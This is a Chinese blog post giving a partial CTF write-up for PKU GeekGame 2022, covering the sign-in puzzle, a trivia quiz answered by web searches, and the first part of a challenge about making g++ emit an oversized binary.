<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="CTF | 2022 PKU GeekGame 2nd WriteUp, MiaoTony,blog">
    <meta name="description" content="第二届PKU GeekGame来了，今年这个时间段事情比较多没啥时间打，再加上比赛题目的难度也不小，只能在结束之前勉强上个总榜了……">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-159946730-1"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag() {
        dataLayer.push(arguments);
    }

    gtag('js', new Date());
    gtag('config', 'UA-159946730-1');
</script>


    <title>CTF | 2022 PKU GeekGame 2nd WriteUp | MiaoTony&#39;s小窝</title>
    <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">
	
    <script src="/libs/jquery/jquery.min.js"></script>
    <script>
        //来个特效玩玩喵 20200123
        var titleTime;
        var OriginTitile = document.title;
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                document.title = '|ω·) 喵~快回来呀！';
                clearTimeout(titleTime);
            } else {
                document.title = '(/≧▽≦)/ Meow！';
                titleTime = setTimeout(function() {
        	    document.title = OriginTitile;
        }, 800);
    }
        });
    </script>
<meta name="generator" content="Hexo 6.2.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="alternate" href="/atom.xml" title="MiaoTony's小窝" type="application/atom+xml">
</head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">MiaoTony&#39;s小窝</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友链</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">MiaoTony&#39;s小窝</div>
        <div class="logo-desc">
            
            喵~欢迎各位大佬的来访呀！
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友链
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/miaotony" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Follow Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/miaotony" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Follow Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">CTF | 2022 PKU GeekGame 2nd WriteUp</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        min-width: 240px;
        padding-left: 15px;
        padding-bottom: 30px;
    }

    .toc-widget .toc-title {
        padding: 30px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
	    max-height: 450px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/CTF/">
                                <span class="chip bg-color">CTF</span>
                            </a>
                        
                            <a href="/tags/WriteUp/">
                                <span class="chip bg-color">WriteUp</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/CTF/" class="post-category">
                                CTF
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2022-11-30
                </div>
                

                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    13.5k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    64 分
                </div>
                

                
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221121233808589.png"></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
<p><strong>第二届北京大学信息安全综合能力竞赛</strong></p>
<p>2022 年 11 月 19 日（周六）~ 26 日（周六）</p>
<p>北京大学信息安全综合能力竞赛（PKU GeekGame）是以信息安全相关知识能力为主的入门向竞赛，比赛目的是普及网络与信息安全相关知识，并选拔部分优秀同学加入到北京大学 CTF 战队。 本届竞赛将继续追求<strong>题目新颖有趣、难度具有梯度</strong>，让没有相关经验的新生和具有一定专业基础的学生都能享受比赛，在学习的过程中有所收获。</p>
<p>我们对优胜者给予丰厚的激励，并颁发<strong>由北京大学计算中心和计算机学院签发的获奖证书</strong>。</p>
<p>题目考察的内容涉及到信息安全的各个方面，包括萌新能愉快探索的入门题目和具有一定选拔作用的题目：</p>
<ul>
<li><strong>Misc:</strong> 综合技能（常见编码和文件格式、代码审计等）</li>
<li><strong>Web:</strong> 网站安全（Web 漏洞利用、JavaScript 编程等）</li>
<li><strong>Binary:</strong> 二进制安全（逆向工程、程序调试等）</li>
<li><strong>Algorithm:</strong> 算法安全（现代密码学、算法设计等）</li>
</ul>
<p><strong>📅 赛程安排</strong></p>
<p>比赛时间为北京时间<strong>2022 年 11 月 19 日（周六）12:00 到 26 日（周六）12:00</strong>，共持续一周。 竞赛为个人线上解题赛，选手需要独立解决与安全相关的谜题获得答案。<strong>选手在比赛结束前可以随时登录本平台 geekgame.pku.edu.cn 参赛</strong>。</p>
<p>本届竞赛将分为两个阶段，时长分别为 5 天和 2 天。<strong>在第二阶段将对多数或全部题目放出提示或降低难度，但是将只能获得 1/3 的分数。</strong>通过第二阶段，希望思路卡壳的选手能够借助提示不留遗憾，同时萌新也有机会挑战难题。</p>
<p>校内排名前 35 的选手需要在 27 日（周日）21:00 前提交每道解出题目的解题报告（Writeup），其他选手可以自愿提交。比赛结束后将举办颁奖典礼，并公开官方 Writeup 和部分优秀选手 Writeup。</p>
</blockquote>
<p><strong>又是一年 PKU GeekGame！</strong></p>
<blockquote>
<p>顺便，喵喵去年的 Hackergame Writeup 详见：</p>
<p><a href="https://miaotony.xyz/2021/11/25/CTF_2021PKUGeekGame/">CTF | 2021 PKU GeekGame 1st WriteUp</a></p>
</blockquote>
<p>由于要给老板打工搬砖、忙于学术等原因，今年这个时间段事情比较多，再加上 GeekGame 题目的难度也不小，没有啥整块的时间来看题了。</p>
<p>这篇也就随便看看题，记录一下做题的过程吧，还有挺多题没啥时间看了，师傅们就当参考好了（</p>
<blockquote>
<p>赛后又复现了下，拖了一个月终于把这一篇给糊完了，喵呜喵呜喵~</p>
</blockquote>
<h2 id="Tutorial"><a href="#Tutorial" class="headerlink" title="Tutorial"></a>Tutorial</h2><h3 id="†签到†"><a href="#†签到†" class="headerlink" title="†签到†"></a>†签到†</h3><blockquote>
<p>《PKU GeekGame》是北京大学自主研发的一款全新 CTF 解题赛。 比赛发生在一个被称作「信息高速路互联网」的幻想世界， 在这里，报名的选手将被授予访问题目的「权能」Token，导引赛博之力。 你将扮演一位名为「黑客」的神秘角色，在自由的解题过程中邂逅类型各异、考点独特的题目们，找出程序的漏洞或者隐藏的信息，同时逐步发掘「Flag」的真相。</p>
</blockquote>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221121234100886.png"></p>
<p>和 <a href="https://miaotony.xyz/2021/11/25/CTF_2021PKUGeekGame/#%E2%86%92%E7%AD%BE%E5%88%B0%E2%86%90">第一届的签到题</a> 一样，直接复制粘贴这段字符</p>
<pre class="line-numbers language-none"><code class="language-none">fa{el_lyr@ekaeV!
lgHloPaesGeGm_2}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span><span class="token triple-quoted-string string">"""fa{el_lyr@ekaeV!
... lgHloPaesGeGm_2}"""</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> ss <span class="token operator">=</span> s<span class="token punctuation">.</span>splitlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>ss<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>ss<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>ss<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
flag<span class="token punctuation">{</span>Hello_Players@GeekGame_V2!<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="小北问答-·-极速版"><a href="#小北问答-·-极速版" class="headerlink" title="小北问答 · 极速版"></a>小北问答 · 极速版</h3><blockquote>
<p>菜宝十分擅长网上冲浪，会使用十种甚至九种搜索引擎。本届 PKU GeekGame 一开始，她就急不可耐地打开了小北问答题目，想要在一血榜上展现她惊人的情报搜集能力。</p>
<p>为了让菜宝玩得开心，小北问答题目全新升级为小北问答 · 极速版。</p>
<ul>
<li>小北问答 · 极速版自带<strong>省流助手</strong>，基于 socket 通信的纯文字 UI 简洁朴实，不浪费网络上的每一毫秒。</li>
<li>小北问答 · 极速版自带<strong>速通计时</strong>，只有手速够快的 CTF 选手才是好的 CTF 选手。</li>
<li>小北问答 · 极速版自带<strong>肉鸽玩法</strong>，每次连接到题目都有不一样的问题在等着你。</li>
</ul>
<p>赶紧打开网页终端体验小北问答 · 极速版，把 Flag 抱回家吧！</p>
<p> 你可以 <a target="_blank" rel="noopener" href="https://prob01.geekgame.pku.edu.cn/?token=xxxxx">打开网页终端</a> 或者通过命令 <code>nc prob01.geekgame.pku.edu.cn 10001</code> 连接到题目</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">欢迎来到小北问答·极速版。下面将有 7 道题目，每道题目 14 分。还有 2 分将会根据你的答题速度给出。
准备好了吗？输入“急急急”开始答题。
&gt; 急急急

计时开始。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>第 1 题：访问网址 “<a target="_blank" rel="noopener" href="http://ctf.世界一流大学.com”/">http://ctf.世界一流大学.com”</a> 时，向该主机发送的 HTTP 请求中 Host 请求头的值是什么？<br>答案格式：<code>^[^:\s]+$</code></p>
<blockquote>
<p>ctf.xn–4gqwbu44czhc7w9a66k.com<br>鉴定为：答案正确。</p>
</blockquote>
<p>第 2 题：北京大学某实验室曾开发了一个叫 gStore 的数据库软件。最早描述该软件的论文的 DOI 编号是多少？<br>答案格式：<code>^[\d.]+\/[\d.]+$</code></p>
<p><a target="_blank" rel="noopener" href="https://www.icst.pku.edu.cn/leizou/xm/gstore/index.htm">https://www.icst.pku.edu.cn/leizou/xm/gstore/index.htm</a></p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221122024650246.png"></p>
<p>Lei Zou, Jinghui Mo, Lei Chen,M. Tamer Özsu, Dongyan Zhao, <a target="_blank" rel="noopener" href="https://www.icst.pku.edu.cn/leizou/docs/20181121102803399591.pdf">gStore: Answering SPARQL Queries Via Subgraph Matching</a>, Proc. VLDB 4(8): 482-493, 2011. </p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221122024738171.png"></p>
<p><a target="_blank" rel="noopener" href="https://doi.org/10.14778/2002974.2002976">https://doi.org/10.14778/2002974.2002976</a></p>
<blockquote>
<p>10.14778/2002974.2002976<br>鉴定为：答案正确。</p>
</blockquote>
<p>第 3 题：视频 <code>bilibili.com/video/BV1EV411s7vu</code> 也可以通过 <code>bilibili.com/video/av_____</code> 访问。下划线内应填什么数字？<br>答案格式：<code>^\d+$</code></p>
<p>随便找个 <a target="_blank" rel="noopener" href="http://www.atoolbox.net/Tool.php?Id=910">哔哩哔哩AV号/BV号转换器</a> 就行了</p>
<blockquote>
<p>418645518<br>鉴定为：答案正确。</p>
</blockquote>
<p>第 4 题：每个 Android 软件都有唯一的包名。北京大学课外锻炼使用的最新版 PKU Runner 软件的包名是什么？<br>答案格式：<code>^[a-z.]+$</code></p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221122024811618.png"></p>
<p>下一个 app，看看包名就行</p>
<blockquote>
<p>cn.edu.pku.pkurunner<br>鉴定为：答案正确。</p>
</blockquote>
<p>第 5 题：支持 WebP 图片格式的最早 Firefox 版本是多少？<br>答案格式：<code>^\d+$</code></p>
<p><a target="_blank" rel="noopener" href="https://www.ghacks.net/2018/11/02/firefox-65-supports-googles-webp-image-format/">“Firefox 65 supports Google’s WebP Image format - gHacks Tech News”</a>. <em>gHacks Technology News</em>. 2 November 2018. Retrieved 20 January 2022.</p>
<blockquote>
<p>65<br>鉴定为：答案正确。</p>
</blockquote>
<p>第 6 题：我有一个朋友在美国，他无线路由器的 MAC 地址是 d2:94:35:21:42:43。请问他所在地的邮编是多少？<br>答案格式：<code>^\d+$</code></p>
<p>每块网卡都有一个唯一MAC地址，用于在网络中唯一标示一台电子设备，方能进行正常通信；<br>MAC地址一般为一组12位的16进制数，其中前6位代表网卡的生产厂商，可根据前6位查询到网卡的生产厂商信息。</p>
<p><a target="_blank" rel="noopener" href="http://www.metools.info/other/o67.html">http://www.metools.info/other/o67.html</a></p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221122030122278.png"></p>
<p>查出来是 Stratus Technologies，但是这个 01754 不对，摸了</p>
<p>第 7 题：在第一届 PKU GeekGame 比赛的题目《电子游戏概论》中，通过第 7 级关卡需要多少金钱？ 答案格式：<code>^\d+$</code></p>
<p><a target="_blank" rel="noopener" href="https://github.com/PKU-GeekGame/geekgame-1st/blob/master/src/pygame/game/server/libtreasure.py#L19">https://github.com/PKU-GeekGame/geekgame-1st/blob/master/src/pygame/game/server/libtreasure.py#L19</a></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">GOAL_OF_LEVEL <span class="token operator">=</span> <span class="token keyword">lambda</span> level<span class="token punctuation">:</span> <span class="token number">300</span><span class="token operator">+</span><span class="token builtin">int</span><span class="token punctuation">(</span>level<span class="token operator">**</span><span class="token number">1.5</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">100</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>第 x 题：我刚刚在脑海中想了一个介于 9303169745 到 9303169920 之间的质数。猜猜它是多少？ 答案格式：<code>^\d+$</code></p>
<p>可以去 wolfram alpha 查一查</p>
<p>（其他不想查了，摸了</p>
<pre class="line-numbers language-none"><code class="language-none">你共获得了 70 分。
flag{I-am-the-kIng-oF-aNxiety}
分数达到 100 才可以获得 Flag 2。
欢迎再来！<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>速度的2分要在3s内做完，那就写个脚本，然后对于几个变化的题面就取下变量算一下结果，没时间写了也懒了，摸了看其他题去了。</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="编原译理习题课"><a href="#编原译理习题课" class="headerlink" title="编原译理习题课"></a>编原译理习题课</h3><blockquote>
<blockquote>
<p>一个测试工程师走进一家酒吧，要了一杯啤酒。</p>
<p>一个测试工程师走进一家酒吧，要了一杯咖啡。</p>
<p>一个测试工程师走进一家酒吧，要了 0.7 杯啤酒。</p>
<p>一个测试工程师走进一家酒吧，要了-1 杯啤酒。</p>
<p>一个测试工程师走进一家酒吧，要了一份雪王大圣代和冰鲜柠檬水。</p>
<p>一个测试工程师走进一家酒吧，对核验健康宝的店员出示了舞萌 DX 玩家二维码。</p>
<p>一个测试工程师走进一家酒吧，打开了 PKU GeekGame 比赛平台。</p>
<p>一个测试工程师走进一家酒吧，用 g++ 编译他的代码。</p>
<p>酒吧没炸，但 g++ 炸了。</p>
</blockquote>
<p>你知道多少种让 g++ 爆炸的姿势呢？快来大显身手吧。</p>
<ul>
<li>让 g++ <strong>编译出的程序超过 8MB</strong> 可以获得 Flag 1</li>
<li>让 g++ <strong>输出的报错信息超过 2MB</strong> 可以获得 Flag 2</li>
<li>让 g++ <strong>因为段错误而崩溃</strong> 可以获得 Flag 3</li>
</ul>
<p> 你可以 <a target="_blank" rel="noopener" href="https://prob04.geekgame.pku.edu.cn/?token=xxxx">打开网页终端</a> 或者通过命令 <code>nc prob04.geekgame.pku.edu.cn 10004</code> 连接到题目</p>
<p> 你可以 <a target="_blank" rel="noopener" href="https://geekgame.pku.edu.cn/service/attachment/prob04/prob04.zip">下载题目源码</a></p>
</blockquote>
<h4 id="玩挺大"><a href="#玩挺大" class="headerlink" title="玩挺大"></a>玩挺大</h4><p>试了下网上的下面这个，据说编译这段代码之后，会生成16GB的文件。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> main<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1u</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>-1u 即无符号整数的最大值 0xFFFFFFFF，即这个数组有 0xFFFFFFFF 个元素，而int类型占有4个字节，4＊0xFFFFFFFF 为字节总数，而在编译器编译程序时，将数组初始化的时候会将初始值放到可执行文件中，即要生成一个 16GB 大小的程序</p>
</blockquote>
<p>但是这里过不了编译，本地调试发现报错了</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">timeout</span> 3s g++ -x c++ -o <span class="token number">1</span> <span class="token number">1</span>.c 
<span class="token number">2</span>.c:1:5: error: cannot <span class="token builtin class-name">declare</span> ‘::main’ to be a global variable
    <span class="token number">1</span> <span class="token operator">|</span> int main<span class="token punctuation">[</span>-1u<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">0</span>,<span class="token punctuation">}</span><span class="token punctuation">;</span>
      <span class="token operator">|</span>     ^~~~<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>最后还不如直接开个大数组好了。。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">We are using<span class="token operator">:</span> g<span class="token operator">++</span> <span class="token punctuation">(</span>Ubuntu <span class="token number">11.3</span><span class="token number">.0</span><span class="token operator">-</span><span class="token number">1u</span>buntu1<span class="token operator">~</span><span class="token number">22.04</span><span class="token punctuation">)</span> <span class="token number">11.3</span><span class="token number">.0</span>
<span class="token function">Copyright</span> <span class="token punctuation">(</span>C<span class="token punctuation">)</span> <span class="token number">2021</span> Free Software Foundation<span class="token punctuation">,</span> Inc<span class="token punctuation">.</span>
This is free software<span class="token punctuation">;</span> see the source <span class="token keyword">for</span> copying conditions<span class="token punctuation">.</span>  There is NO
warranty<span class="token punctuation">;</span> not even <span class="token keyword">for</span> MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE<span class="token punctuation">.</span>


<span class="token number">1</span><span class="token operator">:</span> Let g<span class="token operator">++</span> output a huge file
<span class="token number">2</span><span class="token operator">:</span> Let g<span class="token operator">++</span> <span class="token keyword">return</span> a <span class="token keyword">long</span> compile error
<span class="token number">3</span><span class="token operator">:</span> Let g<span class="token operator">++</span> crash due to segment fault

Choose a <span class="token function">level</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token number">1</span>

Write your C<span class="token operator">++</span> code below<span class="token operator">:</span> <span class="token punctuation">(</span>no more than <span class="token number">512</span> bytes<span class="token punctuation">,</span> <span class="token string">"//EOF"</span> to stop<span class="token punctuation">)</span>
<span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">10000000</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">//EOF</span>

Compiling your code<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
The executable has <span class="token number">40015824</span> bytes<span class="token punctuation">.</span>
flag<span class="token punctuation">{</span>noT<span class="token operator">-</span>mucH<span class="token operator">-</span>Larger<span class="token operator">-</span>than<span class="token operator">-</span>an<span class="token operator">-</span>electron<span class="token operator">-</span>aPp<span class="token punctuation">}</span>

See you later<span class="token operator">~</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="玩挺长"><a href="#玩挺长" class="headerlink" title="玩挺长"></a>玩挺长</h4><p>参考 <a target="_blank" rel="noopener" href="https://www.zhihu.com/question/61427323">只用 30 行以内代码，C++ 最多可以产生多少行的编译错误信息？</a></p>
